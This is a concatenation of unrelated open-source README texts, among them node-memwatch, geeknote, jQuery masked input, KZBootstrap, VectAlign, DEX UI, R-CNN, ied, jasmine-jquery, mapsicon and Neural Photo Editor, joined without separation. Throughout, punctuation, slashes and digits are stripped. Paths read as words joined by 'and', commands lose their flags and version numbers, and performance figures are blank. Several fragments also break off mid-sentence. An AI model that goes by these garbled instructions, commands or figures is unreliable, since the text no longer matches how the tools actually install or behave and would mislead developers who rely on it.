3379489, node memwatch leak detection and heap diffing for node js  node memwatch is here to help you detect and find memory leaks in node js code it provides a leak event emitted when it appears your code is leaking memory a stats event emitted occasionally giving you data describing your heap usage and trends over time a heapdiff class that lets you compare the state of your heap between two points in time telling you what has been allocated and what has been released installation  npm install memwatch git clone git and and github com and lloyd and node memwatch git description  there are a growing number of tools for debugging and profiling memory usage in node js applications but there is still a need for a platform independent native module that requires no special instrumentation this module attempts to satisfy that need to get started import node memwatch like so javascript var memwatch require memwatch you can then subscribe to leak events a leak event will be emitted when your heap usage has increased for five consecutive garbage collections javascript memwatch on leak  function info the info object will look something like javascript start fri  jun     gmt end fri  jun     gmt growth  reason heap growth over  consecutive gcs s   mb and hr the best way to evaluate your memory footprint is to look at heap usage right aver v performs garbage collection memwatch does exactly this it checks heap usage only after gc to give you a stable baseline of your actual memory usage when v performs a garbage collection technically we re talking about a full gc with heap compaction  memwatch will emit a stats javascript memwatch on stats  function stats the stats data will look something like this javascript numfullgc  numincgc  heapcompactions  estimatedbase  currentbase  min  max  usagetrend  estimatedbase and usagetrend are tracked over time if usage trend is consistently positive it indicates that your base heap size is continuously growing and you might have a leak v has its own idea of when it s best to perform a gc and under a heavy load it may defer this action for some time to aid in speedier debugging memwatch provides a gc method to force v to do a full gc and heap compaction so far we have seen how memwatch can aid in leak detection for leak isolation it provides a heapdiff class that takes two snapshots and computes a diff between them for example javascript and and take first snapshot var hd new memwatch heapdiff and and do some things and and take the second snapshot and compute the diff var diff hd end the contents of diff will look something like javascript before nodes  sizebytes  size   mb  after nodes  sizebytes  size   mb  change sizebytes  size   kb  freednodes  allocatednodes  details what string  sizebytes  size   kb  and   what array  sizebytes  size   kb  and   what leakingclass  sizebytes  size   kb  and   the diff shows that during the sample period the total number of allocated string and array classes decreased but leaking class grew by  allocations hmmm you can use heapdiff in your on stats callback even though it takes a memory snapshot which triggers a v gc it will not trigger the stats event itself because that would be silly future work  please see the issues to share suggestions and contribute

notes you want and give you some examples you can install geeknote as a python script install dependencies this example for debian based systems sudo apt get update sudo apt get y install python setuptools download the repository git clone git and and github com and vitaliyrodnenko and geeknote git cd geeknote installation sudo python  setup py install launch geeknote and go through login procedure geeknote login run tests python  setup py test or for to run tests with tox tox geeknote has some settings that you should know first thing we have to do after installation geeknote is authorization to authorize your geeknote in evernote launch the command login geeknote login this will start the authorization process geeknote will ask you to enter your credentials just once to generate access token which will be saved in local database re authorization is not required if you won t decide to change user after authorization you can start to work with geeknote if you want to change evernote user you should launch logout command geeknote logout and after you can repeat authorization step geeknote settings geeknote  version   app dir and users and username and geeknote error log and users and username and geeknote and error log current editor vim  username username id  email example gmail com geeknote allows to edit notes right in console editors in markdown format we will show it a later in documentation and you can setup the default editor you want to use to check which editor is now set up as a default call geeknote settings editor to change the default editor call geeknote settings editor vim geeknote settings editor current editor is nano geeknote settings editor vim editor successfully saved geeknote settings editor current editor is vim the main functionality that we need is creating notes in evernote geeknote create title title content content tags list of tags notebook notebook where to save title lt title gt with this option we specify the title of new note we want to create content lt content gt specifying the content of new note the content must not contains double quotes notebook lt notebook where to save gt specify the notebook where new note should be saved this option is not required if it isn t given the note will be saved in default notebook if notebook doesn t exist geeknote will create it automatically tags lt list of tags like tag tag gt specify tags that our note will have it can accept multiple tags separated with comma this command allows us to create a new note in evernote geeknote has designed for using in console so we have some restrictions like inability to use double quotes in content option but there is a method to avoid it use stdin stream or file synchronization we show it later in documentation geeknote create title shopping list    content don t forget to buy milk turkey and chips notebook family tags shop holiday important with geeknote you can edit your notes in evernote using any editor you like it could be nano vi vim etc you can edit notes right in console geeknote edit note title of note which to edit title the new title tags new list of data notebook new notebook note lt title of note which to edit gt tell to geeknote which note we want to edit geeknote will make a search by the name if geeknote will find more than one note with such name it will ask you to make a choice title lt a new title gt use this option if you want to rename your note just set a new title and geeknote will rename the old one content lt a new content or write gt enter the new content of your notes in text or write instead the option write in the first case the old content on the note will be replaced with new one in the second case geeknote will get the current content and open it in markdown in a text editor notebook lt notebook where to save gt with this option you can change the notebook which containes your note tags lt list of tags like tag tag gt the same for tags you can set a new list of tags for your note simple editing renaming the note geeknote edit note shoplist    title shoplist    renaming the note and editing content in editor geeknote edit note shoplist    title shoplist    content write you can easily search notes in evernote with geeknote and get results in console geeknote find search text to find tags list of tags that notes should have notebooks list on notebooks where to make search date data ro data range count how many results to show exact entry content search url only with find you can make a search through your evernote it has an usefull options that allow you to make search more detail important notice that geeknote remembers the result of the last search so you can use the number of the note s position to make some actions that geeknote can for example geeknote find search shopping total found   shopping list     shopping list    geeknote show  that will show you the note shopping list    search lt text to find gt set the text you want to find you can use quot  quot like this search quot shop  quot tags lt list of tags that notes should have gt filter by tag it makes possible to search notes that have necessary tags tags can be separated with comma notebooks lt list on notebooks where to make search gt search just in notebook and notebooks you need the list of notebooks specify by comma date date or range filter by date you can set a singl date dd mm yyyy or date range dd mm yyyy dd mm yyyy count lt how many results to show gt limits the number of displayed results exact entry by default geeknote has a smart search so it searches not exact entries but if you need exact entry you can set this option it doesn t take any arguments content search find command searches by note s title if you want to search by note s content set this option it doesn t take any arguments url only show results as a list of urls to the every note in evernote s web client geeknote find search how to patch kde notebooks jokes date       geeknote find search apt get install apache nginx content search notebooks manual you can output any note in console using command show that is add on for find when you use show it make search previously and if the count of results more then  geeknote will ask you to make a choise geeknote show text to search and show that is really simple so doesn t need any descriptions just some examples geeknote show shop total found   shopping list     shopping list     cancel  as we mentioned before show can use the results of previous search so if you have already done the search just call show with number of previous search results geeknote find search shop total found   shopping list     shopping list    geeknote show  you can remove notes with geeknotes from evernote geeknote remove

451490, masked input plugin for jquery  notice this project is no longer being maintained this is a masked input plugin for the jquery javascript library it allows a user to more easily enter fixed width input where you would like them to enter the data in a certain format datesphone numbers etc it has been tested on internet explorer firefox safari opera and chrome a mask is defined by a format made up of mask literals and mask definitions any character not in the definitions list below is considered a mask literal mask literals will be automatically entered for the user as they type and will not be able to be removed by the user the following mask definitions are predefined a represents an alpha character a za z  represents a numeric character   represents an alphanumeric character a za z  first include the jquery and masked input javascript files next call the mask function for those items you wish to have masked jquery function date mask  and  and  phone mask    tin mask   ssn mask    optionally if you are not satisfied with the underscore  character as a placeholder you may pass an optional argument to the maskedinput method jquery function product mask  and  and   placeholder optionally if you would like to execute a function once the mask has been completed you can specify that function as an optional argument to the maskedinput method jquery function product mask  and  and   completed function alert you typed the following and this val optionally if you would like to disable the automatic discarding of the uncomplete input you may pass an optional argument to the maskedinput method jquery function product mask  and  and   autoclear false you can now supply your own mask definitions jquery function mask definitions and eyescript mask      you can have part of your mask be optional anything listed after within the mask is considered optional user input the common example for this is phone number and optional extension jquery function phone mask    x if your requirements aren t met by the predefined placeholders you can always add your own for example maybe you need a mask to only allow hexadecimal characters you can add your own definition for a placeholder say h  like so mask definitions h a fa f  then you can use that to mask for something like css colors in hex with a mask hhhhhh jquery function phone mask hhhhhh by design this plugin will reject input which doesn t complete the mask you can bypass this by using a character at the position where you would like to consider input optional for example a mask of    x would require only the first  digits of a phone number with extension being optional getting the bits  bower install save jquery maskedinput setting up your developer environment  to get your environment setup correctly you ll need nodejs version    or greater installed you ll also need to install the grunt command line tool sudo npm install g grunt cli once node is installed on your system all that you need to do is install the developer dependencies and run the grunt build npm install grunt
25251845, how do you setup your ios projects since we are approaching  i m working on refreshing my project bootstrap i ve decided to open source it so other can benefit or contribute i think it s pretty neat but decide for yourself it s still wip so pull requests are most welcomed a project by default has  configurations  release each configuration can be put side by side on same device and you can clearly distinguish each build easier to find issues across different versions and branches and screenshots and configurations png raw true looking at each of the icon you get following informations build number  branch master commit hash version   configuration that the app was built with you can also use kzbootstrap api to query those informations while running your application and screenshots and log png raw true warnings were added by compiler team for a reason as such i start with weverything and disable few warnings wno objc missing property synthesis don t want to do synthesize on properties wno unused macros annoying when doing dsl wno disabled macro expansion needed for dsl and metaprogramming wno gnu statement expression helpful wno language extension token language extensions are useful wno overriding method mismatch so i can change id to specific type and avoid unnecesary local variables also treat warnings as errors is a must turn all todo and fixme into warnings and screenshots and todo png raw true warnings when files get too big and screenshots and lines png raw true add kzbignorelinecount anywhere in file to disable warning generation for that file automatically generate macro for current developer that way a team can have different code paths while they are working on features or different logging levels without git changes if merowing and and my code one more thing let s add some macros to prevent nil passed in as arguments kzbrequireallparams kzbrequireparams  and screenshots and null png raw true when your subclasses should call super kzbrequiresuper and screenshots and super png raw true when you want to avoid spelling errors kzbkeypath kzbkeypatht and screenshots and keypaths png raw true often when working with big clients you need to have multiple environments for staging and production and qa etc they usually differ in some kind of configuration eg different url endpoints too many times i ve seen people creating separate targets for each of them which leads to maintenance costs and unnecessary bloat and clutter as such i ve created a different approach with some nice automation default environments can be changed either via xcodebuild user variable on jenkins or via launch argument inside your schema on jenkins xcodebuild  kzbenv  production build in custom schema edit scheme arguments launch arguments  kzbenvoverride production environments can be changed without reinstalling application even while it s running all environments variables are created in a single plist and screenshots and plist png raw true if any of the variables are missing an entry for one of the environments you get compile time error you can even click on it to go to the configuration file and screenshots and enverror png raw true settings bundle will be automatically injected to give you environment switching and screenshots and settings png raw true you can register for callback when env changes useful if you need to reset your database etc production builds will remove all variables for other environments to prevent exposing non production and unused configurations if you are using cocoalumberjack you can include kzbootstrap and logging subspec to get log formatting that works as clickable links in appcode and screenshots and logs png raw true if you decide to include kzbootstrap and debug subspec you will get assertions when uikit is layouted and displayed on background thread so you can fix your code api interception capabilities for afnetworking which you can either display yourself or send me pr with universal ui or just look at during debuging by calling kzbresponsetracker printall and screenshots and json png raw true it simply add the following line to your podfile kzbootstrap for core functionality kzbootstrap and logging additional logging functionality kzbootstrap and debug additional debugging functionality there are few things you need to do with your project you can either use my crafter setup tool to make it automatic or do it manually kzbenvironments plist with kzbenvironments key containing array of all environments all extra keys are treated as env variables and should have a value for each of the allowed env s bundledisplaynamesuffix and bundleidsuffix should be added to user defined settings in your target plist file append both display name and bundle identifier keys with those variables eg app bundledisplaynamesuffix add kzbenv user defined setting with value of default env for each configuration then in preprocessor macros add kzbdefaultenv kzbenv add empty file named kzbootstrapusermacros h anywhere in your project and include it into your prefix pch file include that file in your gitignore set warnings as described above you should have settings bundle in the project so the code can inject it with environment switching functionality add script execution at the end of your build phases srcroot and pods and kzbootstrap and pod and assets and scripts and bootstrap sh you can selectively enable features by passing arguments to bootstrap sh l will enable line count warnings t will enable todo warnings u will enable user macros n will enable build number automation i will enable icon versioning this also enables build number automation crafter configure do this are projects wide instructions addplatform platform

41884850, vectalign a k a vectordrawablealign is a developer s tool which automagically aligns two vectordrawable pathdata strings or svg images in order to allow morphing animations between them using an animatedvectordrawable vectalign can be used from command line or through a simple gui which includes morphing preview and export functionalities here are some examples of what you can do with the help of vectalign take a look at the sample project for a live demo the problem as stated in the official docs two paths must be compatible so that they can be morphed which means that the paths must be composed by the same list of svg commands in terms of length and type of commands example of compatible paths m  l  l  l  z m  l  l  l  z example of incompatible paths m  l  l  l  z m  l  c    l  l  z creating an animatedvectordrawable containing morphing animations which use incompatible paths leads to runtime exceptions like the following android view inflateexception binary xml file line  can t morph from m  l  l  l  z to m  l  c    l  l  z at android animation animatorinflater setupanimatorforpath animatorinflater java  at android animation animatorinflater parseanimatorfromtypearray animatorinflater java  when the morphing involves only simple shapes is averagely simple to fix the paths by manually injecting or duplicating commands here and there but when the complexity of the shapes grows this task becomes quite tedious to do by hand sometimes almost impossible vectalign automagically aligns any pair of svg paths regardless of their complexity  creating a new pair of morphable paths without altering the original images download you can download the latest version of the pre compiled jar from here changelog v  added different morphing strategies base linear sub base sub linear added gui view load and edit svg and pathdata morphing preview added export function automatically creates all the android xml resources required v  first public release of vectalign command line only run vectalign from command line by passing the two paths that you want to use in your morphing animation you can pass these sequences by typing them directly or by referring a file a simple txt file or even a standard svg image simply pass no params if you want to start the gui examples of execution run vectalign in gui mode java jar vectalign jar java jar vectalign jar gui run vectalign in command line mode java jar vectalign jar start m  end m  java jar vectalign jar start image svg end image svg the result represents the aligned and

txt file or svg file m mode base and linear and subbase and sublinear aligning technique default is base v version print the version of the application h help how it works vectalign is based on an adaptation of the needleman wunsch algorithm which is used in bioinformatics to align protein or nucleotide sequences notes and known issues this is an experimental tool which faces a complex task result s quality may vary depending on the inputs thus wow effect of the resulting animation is not guaranteed aligning complex shapes may create visual artifacts on one or both images in this case try to simplify the original svg path e g using inkscape and then run vectalign again see also the tips section when referring a svg file all the path groups which compose the image will be merged in one single path if your svg path is too much complex the system renderer will throw a silent exception openglrenderer path too large to be rendered into a texture in this case you need to simplify your image further when morphing complex aligned paths for best result avoid using the fillcolor attribute in your vectordrawable and use the strokecolor only this because filled surfaces are more likely to be affected by artifacts than the stroke only ones and usually provide less gorgeous morphing effects as general rule similar images in terms of svg complexity morph better than very different ones if you don t like the result of a morphing try to alter the original images by simplifying the svg path e g using inkscape and then run vectalign again since animatedvectordrawable is

29548071, the project s source code is hosted here for reference included are the openframeworks project source files and shaders as well as the changes i made to bspwm more below not included are things like fonts and images note dex ui was designed as an experiment or an art piece not distributable software so as a result the code though i ve cleaned it up some is not the easiest to sort through also because it is no longer in development i won t be trying to make this work on other people machines that part s up to you what s happening in the video demo real desktops revolve around windows but most sci fi interfaces have these integrated desktops with all sort of animations and no apparent windows dex ui aimed to create the illusion of a desktop environment without windows while in reality still operating with windows in x windowing system to do this the interface is a single openframeworks program that handles all the animations by modifying bspwm i added a window mode to allow the interface to sit fullscreen beneath any other window after the introduction animation occurs a terminal urxvt is created above the interface and its size is constrained to the outline drawn in the interface in short it is two layered windows but because the windows have no borders or shadows visually this looks like one integrated interface how do i run dex ui how i contribute this project is here for reference and not in active development so it is very unlikely i will continue to make changes or respond to requests to make changes why openframeworks i needed something capable of creating lots of dynamic animations this could be processing pure opengl openframeworks etc originally my prototypes were in processing but for performance reasons i switched to openframeworks from what i ve learned many movie interfaces are put together in aftereffects so if you wanted to create an interface that did not respond to input this is also an option bspwm bspwm was what i was working with but it took some effort to make a window persistently stay fullscreen the choice of window manager isn t a huge deal just find something to make the illusion work i ve also included a diff file with the changes to bspwm commit cbc i made to bspwm to add what i for no reason named power mode a window can be set to power mode making it stay fullscreen beneath all other windows across multiple desktops i ve been told a similar effect can be achieved with wmutils and this might be an easier route font inside the terminal we have fira mono and the rest is united sans medium is this working with real data the keyboard contains some code to work using and dev and input but the rest still needs to be hooked up to system data luckily this is straightforward and only requires replacing the generated data with sampled data why the onscreen keyboard does it work with touch screens it s there because i think it looks cool while it doesn t work with touch screens it might be possible by making the project respond to mouse and touch input

shoutout to evan shelhamer for maintaining caffe and helping to merge the r cnn fine tuning code into caffe r cnn is a state of the art visual object detection system that combines bottom up region proposals with rich features computed by a convolutional neural network at the time of its release r cnn improved the previous best detection performance on pascal voc  by  relative going from   to   mean average precision unlike the previous best results r cnn achieves this performance without using contextual rescoring or an ensemble of feature types if you find r cnn useful in your research please consider citing inproceedings girshickcvpr author girshick ross and donahue jeff and darrell trevor and malik jitendra  title rich feature hierarchies for accurate object detection and semantic

external and caffe  so create a symlink ln sf cafferoot external and caffe  start matlab make sure you re still in the rcnn directory matlab  check that caffe and matlab wrapper are set up correctly this code should run without error key caffe getinitkey expected output is key   download the model package which includes precompute models see below common issues you may need to set an ldlibrarypath before you start matlab if you see a message like invalid mex file and path and to and rcnn and external and caffe and matlab and caffe and caffe mexa libmklrt so cannot open shared object file no such file or directory then make sure that cuda and mkl are in your ldlibrarypath on my system i use export ldlibrarypath and opt and intel and mkl and lib and intel and usr and local and cuda and lib the quickest way to get started is to download pre computed r cnn detectors currently we have detectors trained on pascal voc  train and val  train and ilsvrc train and val unfortunately the download is large  gb  so brew some coffee or take a walk while waiting from the rcnn folder run the model fetch script and data and fetchmodels sh this will populate the rcnn and data folder with caffenets and rcnnmodels see rcnn and data and readme md for details pre computed selective search boxes can also be downloaded for voc voc and ilsvrc from the rcnn folder run the selective search data fetch script and data and fetchselectivesearchdata sh this will populate the rcnn and data folder with selectiveselectivedata let s assume that you ve downloaded the precomputed detectors now  change to where you installed r cnn cd rcnn  start matlab matlab important if you don t see the message r cnn startup done when matlab starts then you probably didn t start matlab in rcnn directory  run the demo rcnndemo  enjoy the detected bicycle and person let s use pascal voc  as an example the basic pipeline is extract features to disk train svms test you ll need about gb of disk space free for the feature cache which is stored in rcnn and featcache by default symlink rcnn and featcache elsewhere if needed it s best if the feature cache is on a fast local disk before running the pipeline we first need to install the pascal voc  dataset  download the training validation test data and vocdevkit  extract all of these tars into one directory it s called vocdevkit tar xvf voctrainval nov  tar tar xvf voctest nov  tar tar xvf vocdevkit jun  tar  it should have this basic structure vocdevkit and development kit vocdevkit and voccode and voc utility code vocdevkit and voc image sets annotations etc and several other directories  i use a symlink to hook the r cnn codebase to the pascal voc dataset ln sf and your and path and to and voc and vocdevkit and path and to and rcnn and datasets and vocdevkit rcnnexpcachefeatures train chunk rcnnexpcachefeatures val chunk rcnnexpcachefeatures test chunk rcnnexpcachefeatures test chunk pro tip on a machine with one hefty gpu e g  k k titan and a six core processor i run start two matlab sessions each with a three worker matlabpool i then run chunk and chunk in parallel on that machine in this setup completing chunk and chunk takes about   hours depending on your cpu and gpu combo and disk on a single machine obviously if you have more machines you can hack this function to split the workload now to run the training and testing code use the following experiments script testresults rcnnexptrainandtest note the training and testing procedures save models and results under rcnn and cachedir by default you can customize this by creating a local config file named rcnnconfiglocal m and defining the experiment directory variable expdir look at rcnnconfiglocal example m for an example it should be easy to train an r cnn detector using another detection dataset as long as that dataset has complete bounding box annotations i e  all instances of all classes are labeled to support a new dataset you define three functions  one that returns a structure that describes the class labels and list of images  one that returns a region of interest roi structure that describes the bounding box annotations and  one that provides an test evaluation function you can follow the pascal voc implementation as your guide imdb and imdbfromvoc m list of images and classes imdb and roidbfromvoc m region of interest database imdb and imdbevalvoc m evalutation as an example let s see how you would fine tune a cnn for detection on pascal voc   create window files for voc  train and voc  val  start matlab in the rcnn directory  get the imdb for voc  train imdbtrain imdbfromvoc datasets and vocdevkit  train    get the imdb for voc  val imdbval imdbfromvoc datasets and vocdevkit  val    create the window file for voc  train rcnnmakewindowfile imdbtrain external and caffe and examples and pascal finetuning  create the window file for voc  val rcnnmakewindowfile imdbval external and caffe and examples and pascal finetuning  exit matlab  run fine tuning with caffe  copy the fine tuning prototxt files cp finetuning and vocprototxt and pascalfinetune external and caffe and examples and pascal finetuning and  change directories to external and caffe and examples and pascal finetuning  execute the fine tuning code make sure to replace and path and to and rcnn with the actual path to where r cnn is installed gloglogtostderr  and and build and tools and finetunenet bin pascalfinetunesolver prototxt and path and to and rcnn and data and caffenets and ilsvrctrainiterk   and tee log txt note in my experiments i ve let fine tuning run for k iterations although with hindsight it appears that improvement in map saturates at around k iterations

a dependency might have been completed before that of its parent or any of its siblings even started correct caching downloaded packages are being cached locally similarly to the entry dependencies stored in nodemodules  they are being identified by their checksums therefore we can guarantee the consistency of the cache itself without manually invalidating dependencies e g due to overridden version numbers nodemodules as cas packages are always being referenced by their sha  checksums therefore a nodemodules directory can be considered to be a content addressable that packages are being identified by their contents not by arbitrary identifiers such as package names that are not guaranteed to be unique across different registries flat nodemodules due to the cas based design conflicts due to naming collisions are more or less impossible therefore all dependencies can be stored in a flat directory structure circular dependencies and dependencies on different versions of the same packages are still being handled correctly guaranteed uniqueness since the directory in which a specific package is being stored is determined by its shasum  identical packages can t conflict due to their location in the file system itself this also means that the same dependency won t be installed more than once dependencies don t need to be explicitly declared as peerdependencies  since shared sub dependencies are the default not an option atomic installs the atomicity of installs can be ensured on a package level in progress downloads are being stored in nodemodules and tmp and moved into nodemodules once their download has been completed in order to prevent deadlocks packages that have circular dependencies are exempt from this limitation in most cases however the nodemodules directory is consistent at any given point in time during the main installation procedure package names as links while packages are being referenced by their shasum internally they can still be required via their human readable equivalent name package names themselves are simply symbolic links to the actual content addressed package itself a nice side effect of this design is that in contrast to other package managers you can not accidentally require a sub dependency that hasn t been installed as such being resolved correctly arbitrary package groups packages can be grouped into package groups  such as dependencies and devdependencies dependencies can be installed exclusively based on the group they are in internals  under the hood ied maintains an object database  similar to git instead of storing packages by some arbitrary name a sha checksum is being generated to approximate their contents the checksums can not only be used for guaranteeing a certain level of trust and consistency but they also simplify the algorithm through which dependencies are being managed the algorithm through which packages are being installed guarantees consistency through atomic installs the installation of a package either fails or succeeds but at no point in time can a dependency itself be required without having its own sub dependencies installed with the exception of shared circular dependencies the checksum of a package is based on the contents of the package itself not of its sub dependencies therefore the validity of a package can be verified by hashing the package itself subsequent dependency updates have no effect of the generated checksum since nodemodules is essentially a file system based content addressable storage multiple versions of the same package can co exist in the same project in order to expose dependencies via commonjs symbolic links are being created that reference a specific version of the package this has multiple advantages  undeclared dependencies that have been installed as sub dependencies of direct dependencies are unlikely to be required accidentally  there is no need to manually as in additionally to the installation procedure itself de duplicate the dependency graph as long as the uniqueness of filenames itself can be guaranteed on an os level it is impossible to install the same package twice this does not prevent users from installing different versions of the same dependency as long as the content is different whereas a different version declared in the package json counts as different contents  shorter pathnames and less problems due to os level limitations as in windows where the maximum path length is limited  additional application level startup performance improvements require needs to traverse less directories a limited number of symbolic links need to be followed this performance improvement is primarily useful for continuously running tests where startup time is actually noticeable for larger test suits the used directory structure is primarily optimized for reducing the amount of io interaction with the file system during subsequent installations and guaranteeing the consistency of installed packages a consequence of the algorithm used by node all packages need to be stored in a project level nodemodules directory this directory is completely flat on a package level meaning that there are no nested packages inside it instead each package is being stored in its content addressed directory such a directory has two sub directories package this is where the unpacked package contents is being stored at no point in time will this directory be modified this enables us to verify the integrity of the package at a later point in time by comparing the actual checksum to the one defined by other dependents or registries nodemodules sub dependencies of the dependency installed in package are being referenced by symbolic links in nodemodules of the package itself require resolve will fall back to this level after failing to locate a dependency in package this means checked in dependencies are still supported provided that their sub dependencies are also available anywhere in the dependency graph on a project level the nodemodules directory contains the fetched packages installed dependencies and links that expose the packages to user land via require a comparison of sample directory structures produced by ied npm  and npm  is available as a github the original idea was to implement npm s pre v install algorithm in as few lines as possible this goal was achieved in currently the main goal of this project is to provide a more performant alternative to npm installation  npm i g ied alternatively you can also bootstrap ied after an initial installation via npm ied will install its own dependencies the goal of ied is to support  per cent of the npm commands that one uses on a daily basis feature parity with npm other than with its installation process itself is not an immediate goal raw performance is the primary concern during the development process a global configuration src and config js can be supplied via environment variables nodedebug can be used in order to debug specific sub systems the progress bar will be disabled in that case although run script is supported lifecycle scripts are not at this point in time the majority of the command api is self documenting bin and cmd js more extensive documentation will be available once the api is stabilized a high level usage usage txt help is also supplied the main goal is to keep the api predictable for regular npm users this means certain flags such as for example save  save dev  save optional  are supported ied is a package manager for node ied command arguments the commands are install fetch packages and dependencies run run a package json script shell enter a sub shell with augmented path ping check if the registry is up config print the used config init initialize a new package link link the current package or into it unlink unlink the current package or from it start runs ied run start stop runs ied run stop build runs ied run build test runs ied run test h help show usage information v version print the current version s save update package json dependencies d save dev update package json devdependencies o save optional update package json optionaldependencies r registry use a custom registry b build execute lifecycle scripts upon completion e g postinstall example ied install can specify one or more ied install semver    tape if no argument is supplied installs dependencies from package json sub commands can also be called via their shorthand aliases development notes  to run the test suite run npm test the test suite mocks all http requests with fixtures cached inside fixtures and generated and if you make new tests that perform http requests it ll be saved there some ideas and upcoming features of ied are heavily

610547, neither me the original lib author nor travis the current lib maintainer can maintain this library any longer as actively as the great community around it deserves a set of custom matchers for jquery framework an api for handling html css and json fixtures in your specs choose one of the following options using bower by running bower install jasmine jquery save jasmine jquery provides the following custom matchers in alphabetical order tobechecked only for tags that have checked attribute tobedisabled tobeempty checks for child dom elements or text tobefocused tobehidden elements can be considered hidden for several reasons they have a css display value of none they are form elements with type equal to hidden their width and height are explicitly set to  an ancestor element is hidden so the element is not shown on the page tobeindom checks to see if the matched element is attached to the dom e g expect id name  tobeindom tobematchedby jqueryselector check to see if the set of matched elements matches the given selector e g expect span and span addclass js something tobematchedby js something true if the dom contains the element tobeselected only for tags that have selected attribute e g expect option selected selected and option tobeselected tobevisible elements are considered visible if they consume space in the document visible elements have a width or height

value only for elements on which val can be called input  textarea  etc the same as with standard jasmine matchers all of the above custom matchers may be inverted by using not prefix e g the fixture module of jasmine jquery allows you to load html content to be used by your tests the overall workflow is as follows in myfixture html file inside your test loadfixtures myfixture html my fixture mytestedplugin expect my fixture to by default fixtures are loaded from spec and javascripts and fixtures you can configure this path jasmine getfixtures fixturespath my and new and path note  if you are running your test with karma  remember that your files are served from a base and directory so your path should be configured to jasmine getfixtures fixturespath base and my and new and path to invoke fixture related methods obtain fixtures singleton through a factory and invoke a method on it jasmine getfixtures load there are also global shortcut functions available for the most used methods so the above example can be rewritten to just loadfixtures several methods for loading fixtures are provided load fixtureurl  fixtureurl loads fixture s from one or more files and automatically appends them to the dom to the fixtures container appendload fixtureurl  fixtureurl same as load but adds the fixtures to the pre existing fixture container read fixtureurl  fixtureurl

same as set but adds the fixtures to the pre existing fixture container preload fixtureurl  fixtureurl pre loads fixture s from one or more files and stores them into cache without returning them or appending them to the dom all subsequent calls to load or read methods will then get fixtures content from cache without making any ajax calls unless cache is manually purged by using clearcache method pre loading all fixtures before a test suite is run may be useful when working with libraries like jasmine ajax that block or otherwise modify the inner workings of js or jquery ajax calls all of above methods have matching global shortcuts loadfixtures fixtureurl  fixtureurl appendloadfixtures fixtureurl  fixtureurl readfixtures fixtureurl  fixtureurl setfixtures html appendsetfixtures html var post fixture find post also a helper method for creating html elements for your tests is provided sandbox attributename value  attributename value it creates an empty div element with a default id sandbox if a hash of attributes is provided they will be set for this div tag if a hash of attributes contains id attribute it will override the default value custom attributes can also be set so e g sandbox will return sandbox id my id  class my class  myattr my attr will return sandbox method is useful if you want to quickly create simple fixtures in your tests without polluting them with html strings setfixtures sandbox class my class sandbox mytestedclassremoverplugin expect sandbox not tohaveclass my class this method also has a global shortcut available sandbox attributename

it may indicate a smell in your test code cleanup cleans up fixtures container this is done automatically between tests by fixtures module so there is no need to ever invoke this manually unless you re testing a really fancy special case and need to clean up fixtures in the middle of your test these two methods do not have global shortcut functions the stylefixtures module is pretty much like the fixtures module but it allows you to load css content on the page while testing it may be useful if your tests expect that certain css rules are applied to elements that you are testing the overall workflow is typically the same in mycssfixture css file elem position absolute inside your test loadstylefixtures mycssfixture css my fixture mytestedplugin expect my fixture elem tohavecss left px notice that if you haven t applied the position absolute rule to the elem and try to test its left position in some browsers e g googlechrome you will allways get the value auto even if your plugin did everything correct and applied positioning so that s why you might need to load style fixtures in firefox though you will get the correct value even without the position absolute by default style fixtures are loaded from spec and javascripts and fixtures you can configure this path jasmine getstylefixtures fixturespath my and new and path like in fixtures module stylefixtures are also automatically cleaned up between tests and are internally cached so you can load the same fixture file in several tests without penalty to your test suite s speed to invoke fixture related methods

with jasmine v   and jasmine jquery v   is to be used with jasmine v   jasmine jquery is tested with jquery   on ie ff chrome and safari there is a high chance it will work with older versions and other browsers as well but i don t typically run test suite against them when adding new features under windows  you have to launch c users username appdata local google chrome sxs application chrome

9372404, thanks so much for the suggestions everybody i m glad you like this project however i won t update anymore this repository i ll let it as is from now on for the community for that matter i ve disabled the issues i hope you understand mapsicon is a free collection of maps for nearly every country in the world available in  different sizes ranging from x pixels to x pixels as well as svg format those maps are intented to serve as nice placeholders or illustations in your project they do not replace real or extremely precise maps and they have no ambition to do so icons are in png  bits with alpha transparency basically the background is transparent and are in a black  color all the icons have been optimized to have the smallest possible size using pngout advpng pngcrush and optipng through imageoptim basically  x  icons weight around  kb the maps are named after the official two letter country codes defined in iso   basically that means the united states are named us canada is named ca you get it some countries have been intentionally omitted either because they have no official maps yet or because they are islands that are so small that they can not be drawn the omitted countries are micronesia jersey marshall islands northern mariana islands palestinia tuvalu and united states minor outlying islands i created this project because i needed to programmatically call icons of countries in a pet project and i couldn t find any free and good icons online i took my courage and created from scratch all those maps using fireworks image assets and namerica png image assets and africa png image assets and asia png image assets and europe png image assets and namerica png image assets and oceania png image assets and samerica png image assets and us png do what you want with them as long as you mention me in your project please don t resell them i forbid it some help

68827685, a simple interface for editing natural photos with generative neural networks to run the neural photo editor you will need python likely version   you may be able to use early versions of python but i m pretty sure there s some incompatibilities with python in here numpy scipy pil tkinter and tkcolorchooser but it is likely that your python distribution already has those by default the npe runs on iansimple this is a slimmed down version of the ian without mdc or rgb beta blocks which runs without lag on a laptop gpu with gb of memory gtm if you re on a windows machine you will want to create a theanorc file and at least set the flag floatx float if you re on a linux machine you can just insert theanoflags floatx float before the command line call if you don t have cudnn simply change line  of the npe py file from dnn true to dnn false note that i presently only have the non cudnn option working for iansimple then run the command python npe py if you wish to use a different model simply edit the line with config path in the npe py file you can make use of any model with an inference mechanism vae or ali based gan you can paint the image by picking a color and painting on the image or paint in the latent space canvas the red and blue tiles below the image the long horizontal slider controls the magnitude of the latent brush and the smaller horizontal slider controls the size of both the latent and the main image brush you can select different entries from the subset of the celeba validation set included in this repository as an npz by typing in a number from   in the bottom left box and hitting infer use the reset button to return to the ground truth image press update to update the ground truth image and corresponding reconstruction with the current image use infer to return to an original ground truth image from the dataset use the sample button to generate a random latent vector and corresponding image use the scroll wheel to lighten or darken an image patch equivalent to using a pure white or pure black paintbrush note that this automatically returns you to sample mode and may require hitting infer rather than reset to get back to photo editing if you wish to train a model the ian py file contains the model configuration and the trainian py file contains the training code which can be run like this python trainian py ian py by default this code will save and overwrite the weights to a npz file with the same name as the config py file i e ian py ian npz  and will output a jsonl log of the training with metrics recorded after every chunk use the resume true flag when calling to resume training a model it will automatically pick up from the most recent epoch you can generate a sample and reconstruction and interpolation grid with python sampleian py ian py my made layer currently only accepts hidden unit sizes that are equal to the size of the latent vector which will present itself as a badparam error since the made really only acts as an autoregressive randomizer i m not too worried about this but it does bear looking into i messed around with the keywords for getmodel you ll need to deal with these if you wish to run any model other than 